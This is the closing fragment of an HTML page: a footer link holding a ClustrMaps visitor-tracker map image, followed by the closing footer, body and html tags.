      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>